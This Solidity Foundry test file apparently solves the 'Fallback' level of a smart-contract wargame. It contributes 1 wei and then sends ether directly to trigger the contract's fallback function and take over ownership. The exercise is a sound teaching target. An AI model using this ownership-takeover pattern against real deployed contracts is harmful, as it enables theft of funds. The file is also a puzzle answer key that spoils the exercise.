// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../instances/Ilevel01.sol";

contract POC is Test {
    Fallback level1 = Fallback(0x14bbf818bAB5c831a0eF8AC95EDbC605F899CEf9);

    function test() external {
        vm.startBroadcast();

        level1.contribute{value: 1 wei}(); // call the contribute function with some ether/wei
        level1.getContribution(); // get the contribution for our user to make sure its updated
        address(level1).call{value: 1 wei}("");
        level1.owner(); // check who is the new owner

        vm.stopBroadcast();
    }
}

